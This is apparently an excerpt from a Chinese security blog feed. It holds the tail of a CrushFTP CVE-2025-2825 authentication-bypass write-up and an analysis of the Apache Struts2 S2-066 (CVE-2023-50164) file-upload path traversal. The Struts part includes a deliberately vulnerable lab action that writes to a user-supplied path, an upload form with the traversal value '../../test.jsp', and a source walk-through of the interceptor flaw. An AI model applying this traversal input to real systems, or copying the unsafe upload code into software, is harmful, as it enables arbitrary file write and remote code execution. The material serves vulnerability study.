<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Properties <span class="title function_">verify_user</span><span class="params">(ServerStatus server_status_frame, String the_user, String the_password, String serverGroup, SessionCrush thisSession, <span class="type">int</span> user_number, String user_ip, <span class="type">int</span> user_port, Properties server_item, Properties loginReason, <span class="type">boolean</span> anyPass)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (the_user.indexOf(<span class="string">&quot;\\&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">           the_user = the_user.substring(the_user.indexOf(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!the_password.startsWith(<span class="string">&quot;SHA:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;SHA512:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;SHA256:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;SHA3:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;MD5:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;MD5S2:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;CRYPT3:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;BCRYPT:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;MD5CRYPT:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;PBKDF2SHA256:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;SHA512CRYPT:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;ARGOND:&quot;</span>)) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">the_password2</span> <span class="operator">=</span> Common.url_decode(the_password);</span><br><span class="line">           <span class="keyword">if</span> (!the_password2.startsWith(<span class="string">&quot;SHA:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;SHA512:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;SHA256:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;SHA3:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;MD5:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;MD5S2:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;CRYPT3:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;BCRYPT:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;MD5CRYPT:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;PBKDF2SHA256:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;SHA512CRYPT:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;ARGOND:&quot;</span>)) &#123;</span><br><span class="line">               <span class="type">Properties</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">               Log.log(<span class="string">&quot;USER_OBJ&quot;</span>, <span class="number">2</span>, <span class="string">&quot;Validating user &quot;</span> + the_user + <span class="string">&quot; with password &quot;</span> + (the_password != <span class="literal">null</span> &amp;&amp; !the_password.equals(<span class="string">&quot;&quot;</span>)) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">               <span class="keyword">if</span> (!ServerStatus.BG(<span class="string">&quot;blank_passwords&quot;</span>) &amp;&amp; the_password.trim().equals(<span class="string">&quot;&quot;</span>) &amp;&amp; !anyPass &amp;&amp; !the_user.equalsIgnoreCase(<span class="string">&quot;ANONYMOUS&quot;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       user = ut.getUser(serverGroup, the_user, <span class="literal">true</span>);</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">                       Log.log(<span class="string">&quot;USER_OBJ&quot;</span>, <span class="number">2</span>, var23);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   Log.log(<span class="string">&quot;USER_OBJ&quot;</span>, <span class="number">1</span>, <span class="string">&quot;Validating user &quot;</span> + the_user + <span class="string">&quot; with local user file:&quot;</span> + (user != <span class="literal">null</span> ? String.valueOf(user.size()) : <span class="string">&quot;no user.XML found!&quot;</span>));</span><br><span class="line">                   <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">                       loginReason.put(<span class="string">&quot;reason&quot;</span>, <span class="string">&quot;valid user&quot;</span>);</span><br><span class="line">                       <span class="type">ServerStatus</span> <span class="variable">var10000</span> <span class="operator">=</span> ServerStatus.thisObj;</span><br><span class="line">                       <span class="keyword">if</span> (ServerStatus.BG(<span class="string">&quot;secondary_login_via_email&quot;</span>) &amp;&amp; the_user.indexOf(<span class="string">&quot;@&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; user.getProperty(<span class="string">&quot;username&quot;</span>).indexOf(<span class="string">&quot;@&quot;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                           the_user = user.getProperty(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (anyPass &amp;&amp; user.getProperty(<span class="string">&quot;username&quot;</span>).equalsIgnoreCase(the_user)) &#123;</span><br><span class="line">                           <span class="keyword">return</span> user;</span><br><span class="line">                       &#125;</span><br></pre></td></tr></table></figure>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>修改了<code>this.thisSession.login_user_pass(false, false, user_name, user_pass))</code>的调用逻辑，传入的第一个参数被固定设置为<code>false</code>  </p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>认证绕过</tag>
        <tag>CrushFTP</tag>
        <tag>CVE-2025-2825</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Struts2 S2-066 任意文件上传漏洞（CVE-2023-50164）</title>
    <url>/archives/fe8a0a5d.html</url>
    <content><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>由于文件上传逻辑存在缺陷，攻击者可以操纵文件上传参数来实现路径穿越，在某些情况下，通过上传的恶意文件可实现远程代码执行。  </p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>2.5.0 &lt;&#x3D; Apache Struts &lt;&#x3D; 2.5.32<br>6.0.0 &lt;&#x3D; Apache Struts &lt;&#x3D; 6.3.0</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用idea创建一个maven-web项目，修改pom.xml文件添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- Struts2 核心库 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;version&gt;2.5.33&lt;/version&gt;--&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- Servlet API --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>编辑<code>web.xml</code>文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在webapp目录下创建<code>upload.jsp</code>文件</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: hejixiong</span><br><span class="line">  Date: <span class="number">2025</span>/<span class="number">4</span>/<span class="number">25</span></span><br><span class="line">  Time: <span class="number">10</span>:<span class="number">49</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;/upload&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upload&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;uploadFileName&quot;</span> value=<span class="string">&quot;../../test.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在<code>resources</code>目录下创建<code>struts.xml</code>文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.5//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.5.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.demo.UploadAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;fileUpload&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;maximumSize&quot;</span>&gt;</span>52428800<span class="tag">&lt;/<span class="name">param</span>&gt;</span> <span class="comment">&lt;!-- 限制文件大小为50MB --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在<code>java</code>目录下创建<code>UploadAction.java</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.dispatcher.multipart.UploadedFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UploadedFile upload;</span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> UploadedFile <span class="title function_">getUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(UploadedFile upload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;uploadFileName:&quot;</span> + uploadFileName);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadFileName);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">File</span> <span class="variable">content</span> <span class="operator">=</span> (File) upload.getContent();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(content);</span><br><span class="line">        <span class="type">byte</span>[] fileContent = Files.readAllBytes(content.toPath());</span><br><span class="line">        fileOutputStream.write(fileContent);</span><br><span class="line">        fileOutputStream.flush();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置调试环境<br>在idea高级版中由内置的tomcat调试器，选择添加后按照下图配置<br><img src="/archives/fe8a0a5d/img.png" alt="img.png"><br>配置应用上下文为<code>/</code><br><img src="/archives/fe8a0a5d/img_1.png" alt="img_1.png">  </p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>该漏洞因<code>org.apache.struts2.interceptor.FileUploadInterceptor</code>而起，我们也从这个类开始分析  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ActionContext</span> <span class="variable">ac</span> <span class="operator">=</span> invocation.getInvocationContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) ac.get(ServletActionContext.HTTP_REQUEST);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(request <span class="keyword">instanceof</span> MultiPartRequestWrapper)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="type">ActionProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> invocation.getProxy();</span><br><span class="line">                LOG.debug(getTextMessage(<span class="string">&quot;struts.messages.bypass.request&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;proxy.getNamespace(), proxy.getActionName()&#125;));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> invocation.invoke(); <span class="comment">// 这里需要将request包装成MultiPartRequestWrapper对象 这样在获取请求参数的时候参能获取到form表单里的参数</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ValidationAware</span> <span class="variable">validation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">action</span> <span class="operator">=</span> invocation.getAction(); <span class="comment">// 得到UploadAction</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">instanceof</span> ValidationAware) &#123;</span><br><span class="line">            validation = (ValidationAware) action;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">MultiPartRequestWrapper</span> <span class="variable">multiWrapper</span> <span class="operator">=</span> (MultiPartRequestWrapper) request;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (multiWrapper.hasErrors() &amp;&amp; validation != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">TextProvider</span> <span class="variable">textProvider</span> <span class="operator">=</span> getTextProvider(action);</span><br><span class="line">            <span class="keyword">for</span> (LocalizedMessage error : multiWrapper.getErrors()) &#123;</span><br><span class="line">                String errorMessage;</span><br><span class="line">                <span class="keyword">if</span> (textProvider.hasKey(error.getTextKey())) &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(error.getTextKey(), Arrays.asList(error.getArgs()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(<span class="string">&quot;struts.messages.error.uploading&quot;</span>, error.getDefaultMessage());</span><br><span class="line">                &#125;</span><br><span class="line">                validation.addActionError(errorMessage);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// bind allowed Files</span></span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">fileParameterNames</span> <span class="operator">=</span> multiWrapper.getFileParameterNames(); <span class="comment">// 文件参数  我们只上传了一个文件 所以这里只有一个</span></span><br><span class="line">        <span class="keyword">while</span> (fileParameterNames != <span class="literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;</span><br><span class="line">            <span class="comment">// get the value of this input tag</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">inputName</span> <span class="operator">=</span> (String) fileParameterNames.nextElement(); <span class="comment">// inputname即我们form表单类型为file的input标签的name属性值</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// get the content type</span></span><br><span class="line">            String[] contentType = multiWrapper.getContentTypes(inputName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isNonEmpty(contentType)) &#123;</span><br><span class="line">                <span class="comment">// get the name of the file from the input tag</span></span><br><span class="line">        <span class="comment">// 这里会将multipart文件的那部分的filename属性的值进行规范化，检查是否存在`/`与`\`，</span></span><br><span class="line">        <span class="comment">// 直接通过这个参数进行路径穿越是不可行的</span></span><br><span class="line">                String[] fileName = multiWrapper.getFileNames(inputName);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (isNonEmpty(fileName)) &#123;</span><br><span class="line">                    <span class="comment">// get a File object for the uploaded File</span></span><br><span class="line">                    UploadedFile[] files = multiWrapper.getFiles(inputName);</span><br><span class="line">                    <span class="keyword">if</span> (files != <span class="literal">null</span> &amp;&amp; files.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        List&lt;UploadedFile&gt; acceptedFiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedContentTypes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedFileNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(files.length);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">contentTypeName</span> <span class="operator">=</span> inputName + <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">fileNameName</span> <span class="operator">=</span> inputName + <span class="string">&quot;FileName&quot;</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; files.length; index++) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) &#123;</span><br><span class="line">                                acceptedFiles.add(files[index]);</span><br><span class="line">                                acceptedContentTypes.add(contentType[index]);</span><br><span class="line">                                acceptedFileNames.add(fileName[index]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!acceptedFiles.isEmpty()) &#123;</span><br><span class="line">                            Map&lt;String, Parameter&gt; newParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                            newParams.put(inputName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>[acceptedFiles.size()])));</span><br><span class="line">                            newParams.put(contentTypeName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedContentTypes.size()])));</span><br><span class="line">                            newParams.put(fileNameName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedFileNames.size()])));</span><br><span class="line">                            <span class="comment">// 将文件内容 文件类型  文件名放到 newParams 里后又将器添加到actionContext的params参数中</span></span><br><span class="line">                            <span class="comment">// 漏洞的关键也在这里</span></span><br><span class="line">                            ac.getParameters().appendAll(newParams);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                        LOG.warn(getTextMessage(action, <span class="string">&quot;struts.messages.invalid.file&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                    LOG.warn(getTextMessage(action, <span class="string">&quot;struts.messages.invalid.content.type&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// invoke action</span></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们调试到<code>appendAll</code>方法里面查看各个变量的值  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">appendAll</span><span class="params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;</span><br><span class="line">        parameters.putAll(newParams);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/archives/fe8a0a5d/img_2.png" alt="img_2.png"><br>通过观察可知，ActionContext的parameters变量在追加前就已经又一个元素了，这个元素来自我们文件上传时添加的一个input标签其name为<code>uploadFileName</code>，value为<code>../../test.jsp</code><br>这个元素与<code>UploadFileName</code>只有首字母大小不一样。<br>当追加完成后<code>parameters</code>拥有了4个元素，且key为<code>uploadFileName的元素位于第一个</code><br><img src="/archives/fe8a0a5d/img_5.png" alt="img_5.png"><br>关于<code>FileUploadInterceptor</code>拦截器的代码分析这里就告一段落了，当程序继续运行会运行到另一个拦截器<code>ParametersInterceptor</code><br>该拦截器为当前请求对应的Action对象设置属性。  设置属性的方式是通过<code>ActionContext</code>的<code>parameters</code>属性的值将首字母大写后与<code>set</code>拼接作为方法名进行发射调用。<br>如：属性<code>uploadFileName</code>对应的方法为<code>setUploadFileName</code>，<code>UploadFileName</code>对应的方法为<code>setUploadFileName</code>，这两个属性对应的方法相同，<br>那么调用的先后顺序是什么，调用是否会出现短路，选择哪一个进行调用都有讲究。 </p>
